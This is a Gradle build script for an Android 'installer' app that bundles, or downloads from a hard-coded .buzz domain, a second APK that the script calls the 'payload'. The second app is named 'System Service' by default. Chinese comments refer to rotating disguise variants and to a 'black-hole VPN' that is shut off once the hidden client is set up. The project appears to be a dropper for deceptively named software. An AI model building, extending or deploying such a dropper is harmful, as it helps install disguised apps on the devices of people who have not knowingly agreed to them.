plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

fun loadAndroidEnvProps(): MutableMap<String, String> {
    val props = mutableMapOf<String, String>()
    listOf(
        rootProject.file("../android-package.properties"),
        rootProject.file("android-package.properties"),
        rootProject.file("../android-env.properties"),
        rootProject.file("android-env.properties"),
        rootProject.file("local.properties"),
    ).forEach { file ->
        if (!file.exists()) return@forEach
        file.readLines().forEach { raw ->
            val line = raw.trim()
            if (line.isEmpty() || line.startsWith("#")) return@forEach
            val idx = line.indexOf('=')
            if (idx <= 0) return@forEach
            props[line.substring(0, idx).trim()] = line.substring(idx + 1).trim()
        }
    }
    return props
}

fun propOr(props: Map<String, String>, key: String, fallback: String): String =
    props[key]?.trim()?.takeIf { it.isNotEmpty() } ?: fallback

fun escapeAndroidResString(value: String): String =
    value
        .replace("\\", "\\\\")
        .replace("\"", "\\\"")
        .replace("'", "\\'")
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")

fun resolveInstallerUrls(props: Map<String, String>): Pair<String, String> {
    val env = (props["APP_ENV"] ?: "prod").trim().lowercase()
    val prefix = if (env == "dev") "DEV" else "PROD"
    val api = propOr(props, "${prefix}_API_BASE", "https://td.tkjy689.buzz")
    val payload = propOr(
        props,
        "${prefix}_PAYLOAD_APK_URL",
        "https://td.tkjy689.buzz/down/client.apk",
    )
    return api to payload
}

val androidEnvProps = loadAndroidEnvProps()
val (apiBaseUrl, payloadApkUrl) = resolveInstallerUrls(androidEnvProps)
val appEnvName = (androidEnvProps["APP_ENV"] ?: "prod").trim().lowercase()
val clientApplicationId = propOr(androidEnvProps, "CLIENT_APPLICATION_ID", "com.vibelink.client")
val installerApplicationId = propOr(androidEnvProps, "INSTALLER_APPLICATION_ID", "com.vibelink.installer")
val clientAppName = propOr(androidEnvProps, "CLIENT_APP_NAME", "System Service")
val installerAppName = propOr(androidEnvProps, "INSTALLER_APP_NAME", "VibeLink")
val installerVersionCode = propOr(androidEnvProps, "INSTALLER_VERSION_CODE", "1").toInt()
val installerVersionName = propOr(androidEnvProps, "INSTALLER_VERSION_NAME", "1.0.0")
// namespace 与源码目录绑定，禁止随马甲天天改
val clientNamespace = "com.vibelink.client"
val installerNamespace = "com.vibelink.installer"
val clientSetupActivity = "$clientNamespace.ui.SetupWizardActivity"
// android-env.properties: EMBED_CLIENT_APK=0|1（默认 1）
val embedClientApk = propOr(androidEnvProps, "EMBED_CLIENT_APK", "1")
    .let { it == "1" || it.equals("true", ignoreCase = true) }
logger.lifecycle(
    "[Android_O] APP_ENV=$appEnvName applicationId=$installerApplicationId " +
        "version=$installerVersionName($installerVersionCode) " +
        "appName=$installerAppName CLIENT_PACKAGE=$clientApplicationId " +
        "CLIENT_APP_NAME=$clientAppName API_BASE_URL=$apiBaseUrl PAYLOAD=$payloadApkUrl " +
        "EMBED_CLIENT_APK=${if (embedClientApk) "1" else "0"}",
)

android {
    namespace = installerNamespace
    compileSdk = 35

    defaultConfig {
        applicationId = installerApplicationId
        minSdk = 26
        targetSdk = 35
        versionCode = installerVersionCode
        versionName = installerVersionName

        buildConfigField("String", "PAYLOAD_APK_URL", "\"$payloadApkUrl\"")
        buildConfigField("String", "CLIENT_PACKAGE", "\"$clientApplicationId\"")
        buildConfigField("String", "CLIENT_NAMESPACE", "\"$clientNamespace\"")
        buildConfigField("String", "CLIENT_SETUP_ACTIVITY", "\"$clientSetupActivity\"")
        buildConfigField("String", "API_BASE_URL", "\"$apiBaseUrl\"")
        buildConfigField("String", "APP_ENV", "\"$appEnvName\"")
        buildConfigField(
            "String",
            "CLIENT_APP_NAME",
            "\"${clientAppName.replace("\\", "\\\\").replace("\"", "\\\"")}\"",
        )

        resValue("string", "app_name", escapeAndroidResString(installerAppName))
        resValue("string", "client_app_name", escapeAndroidResString(clientAppName))

        // android-env.properties: STOP_VPN_AFTER_SETUP=0|1（默认 0）
        // 1 = B 就绪后停掉 A 的黑洞 VPN，且不再拉起
        val stopVpnAfterSetup = propOr(androidEnvProps, "STOP_VPN_AFTER_SETUP", "0")
            .let { it == "1" || it.equals("true", ignoreCase = true) }
        buildConfigField("boolean", "STOP_VPN_AFTER_SETUP", stopVpnAfterSetup.toString())

        manifestPlaceholders["clientApplicationId"] = clientApplicationId
    }

    buildTypes {
        release {
            isMinifyEnabled = false
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro",
            )
        }
        debug {
            applicationIdSuffix = ".debug"
            buildConfigField("String", "CLIENT_PACKAGE", "\"$clientApplicationId.debug\"")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = "17"
    }

    buildFeatures {
        buildConfig = true
        viewBinding = true
    }

    // 本地 keystore.properties（勿提交）存在时启用 release 签名
    val keystorePropsFile = rootProject.file("keystore.properties")
    if (keystorePropsFile.exists()) {
        val keystoreProps = mutableMapOf<String, String>()
        keystorePropsFile.readLines().forEach { raw ->
            val line = raw.trim()
            if (line.isEmpty() || line.startsWith("#")) return@forEach
            val idx = line.indexOf('=')
            if (idx <= 0) return@forEach
            keystoreProps[line.substring(0, idx).trim()] = line.substring(idx + 1).trim()
        }
        val storePath = keystoreProps["storeFile"] ?: return@android
        signingConfigs {
            create("release") {
                storeFile = rootProject.file(storePath)
                storePassword = keystoreProps["storePassword"]
                keyAlias = keystoreProps["keyAlias"]
                keyPassword = keystoreProps["keyPassword"]
            }
        }
        buildTypes.getByName("release") {
            signingConfig = signingConfigs.getByName("release")
        }
    }
}

dependencies {
    implementation("androidx.core:core-ktx:1.15.0")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.google.android.material:material:1.12.0")
    implementation("androidx.activity:activity-ktx:1.9.3")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.9.0")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.7")
}

// ---------- 把 B 的 release APK 打进 A assets（对齐竞品，安装不依赖海外下载）----------
val payloadAssetDir = layout.projectDirectory.dir("src/main/assets/payload")
val payloadAssetApk = payloadAssetDir.file("client.apk").asFile
/** 只从这些路径取「新的 B」；assets 里的 client.apk 是目标，不是源（否则旧包会永远挡住新 release） */
val clientReleaseCandidates = listOf(
    rootProject.file("../Android/app/build/outputs/apk/release/app-release.apk"),
    rootProject.file("../Android/app/release/app-release.apk"),
    rootProject.file("../client.apk"),
    rootProject.file("client.apk"),
)

fun resolveClientPayloadApk(): java.io.File? =
    clientReleaseCandidates.firstOrNull { it.exists() && it.isFile && it.length() > 1024L }

tasks.register("syncPayloadApk") {
    group = "build"
    description = "Copy B release APK into Android_O assets/payload/client.apk (or strip when EMBED_CLIENT_APK=0)"
    doLast {
        payloadAssetDir.asFile.mkdirs()
        if (!embedClientApk) {
            if (payloadAssetApk.exists()) {
                val removed = payloadAssetApk.delete()
                logger.lifecycle(
                    "[Android_O] EMBED_CLIENT_APK=0，已移除嵌套 B: " +
                        "${payloadAssetApk.absolutePath} (deleted=$removed)",
                )
            } else {
                logger.lifecycle("[Android_O] EMBED_CLIENT_APK=0，assets 无 client.apk，跳过嵌入")
            }
            return@doLast
        }
        val source = resolveClientPayloadApk()
        if (source != null) {
            source.copyTo(payloadAssetApk, overwrite = true)
            logger.lifecycle(
                "[Android_O] synced payload: ${source.absolutePath} -> " +
                    "${payloadAssetApk.absolutePath} (${payloadAssetApk.length()} bytes)",
            )
            return@doLast
        }
        if (payloadAssetApk.exists() && payloadAssetApk.isFile && payloadAssetApk.length() > 1024L) {
            logger.warn(
                "[Android_O] 未找到 B release / 根目录 client.apk，沿用已有 " +
                    "${payloadAssetApk.absolutePath}（可能过期；请先打 Android release）",
            )
            return@doLast
        }
        throw GradleException(
            "缺少 B 的 APK。请先打 Android release，或将 client.apk 放到：\n" +
                "  ${rootProject.file("../client.apk").absolutePath}\n" +
                "  或 ${rootProject.file("client.apk").absolutePath}\n" +
                "若要打空壳 A（不嵌 B），在 android-env.properties 设 EMBED_CLIENT_APK=0",
        )
    }
}

tasks.named("preBuild").configure {
    dependsOn("syncPayloadApk")
}
